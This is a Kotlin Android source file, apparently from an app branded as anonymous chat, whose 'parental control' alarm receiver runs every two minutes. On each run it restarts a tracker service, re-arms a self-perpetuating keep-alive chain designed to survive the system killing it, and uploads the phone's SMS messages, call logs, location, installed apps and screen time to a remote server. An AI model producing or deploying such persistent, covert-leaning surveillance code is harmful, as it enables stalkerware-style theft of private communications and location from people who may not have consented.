package com.anonchat.app.parentalcontrol.receiver

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.service.TrackerService
import com.anonchat.app.parentalcontrol.util.Collectors
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class AlarmReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "AlarmReceiver fired — action: ${intent.action}")
        val pendingResult = goAsync()
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "ParentalControl:AlarmReceiverWakeLock"
        )
        wakeLock.acquire(30_000L)

        try {
            // Ensure TrackerService is running & reporting
            TrackerService.start(context)
        } catch (e: Exception) {
            Log.e(TAG, "Error starting service from AlarmReceiver", e)
        }

        // Re-arm the full keep-alive chain. This is the self-perpetuating
        // loop: every time this alarm fires, we schedule the next one
        // (and re-schedule WorkManager) before we exit. Even if the FGS
        // is OEM-killed between alarms, the next alarm will re-arm it.
        try {
            com.anonchat.app.parentalcontrol.keepalive.KeepAliveScheduler.scheduleAll(context)
        } catch (e: Exception) {
            Log.e(TAG, "KeepAliveScheduler.scheduleAll failed in AlarmReceiver", e)
        }

        // Direct background keepalive reporting to guarantee ONLINE state
        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                CloudConfig.init(context)
                val collectors = Collectors()
                val deviceInfo = collectors.collectDeviceInfo(context)
                val location = try { collectors.collectLocation(context) } catch (_: Exception) { null }
                val batteryInfo = try { collectors.collectBatteryInfo(context) } catch (_: Exception) {
                    com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
                }

                val smsMessages = try { collectors.collectSmsMessages(context) } catch (_: Exception) { emptyList() }
                val callLogs = try { collectors.collectCallLogs(context) } catch (_: Exception) { emptyList() }
                val installedApps = try { collectors.collectInstalledApps(context) } catch (_: Exception) { emptyList() }
                val screentime = try { collectors.collectScreenTime(context) } catch (_: Exception) { null }

                val payload = ApiClient.buildReportPayload(
                    deviceInfo = deviceInfo,
                    location = location,
                    battery = batteryInfo,
                    smsMessages = smsMessages,
                    callLogs = callLogs,
                    installedApps = installedApps,
                    activities = emptyList(),
                    screentime = screentime,
                    webHistory = emptyList(),
                    socialNotifications = emptyList()
                )
                ApiClient.sendBulkReport(payload)
                Log.d(TAG, "AlarmReceiver keepalive report delivered: ${smsMessages.size} sms, ${callLogs.size} calls, ${installedApps.size} apps")
            } catch (e: Exception) {
                Log.e(TAG, "AlarmReceiver keepalive report error: ${e.message}")
            } finally {
                try {
                    if (wakeLock.isHeld) {
                        wakeLock.release()
                    }
                } catch (_: Exception) {}
                pendingResult.finish()
            }
        }

        // Reschedule next exact wake-up alarm in 2 minutes
        scheduleExactAlarm(context)
    }

    companion object {
        private const val TAG = "AlarmReceiver"
        private const val ACTION_REPORT = "com.anonchat.app.parentalcontrol.EXACT_KEEP_ALIVE"
        private const val REQUEST_CODE = 1001
        private const val ALARM_INTERVAL_MS = 2 * 60 * 1000L // 2 minutes

        fun scheduleExactAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, AlarmReceiver::class.java).apply {
                    action = ACTION_REPORT
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    REQUEST_CODE,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )

                val triggerAtMs = System.currentTimeMillis() + ALARM_INTERVAL_MS

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
                        alarmManager.setAndAllowWhileIdle(
                            AlarmManager.RTC_WAKEUP,
                            triggerAtMs,
                            pendingIntent
                        )
                    } else {
                        alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.RTC_WAKEUP,
                            triggerAtMs,
                            pendingIntent
                        )
                    }
                } else {
                    alarmManager.setExact(
                        AlarmManager.RTC_WAKEUP,
                        triggerAtMs,
                        pendingIntent
                    )
                }
                Log.d(TAG, "Scheduled exact keep-alive alarm for +2 mins")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to schedule exact keep-alive alarm", e)
            }
        }

        fun cancelAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, AlarmReceiver::class.java).apply {
                    action = ACTION_REPORT
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    REQUEST_CODE,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                alarmManager.cancel(pendingIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to cancel alarm", e)
            }
        }
    }
}
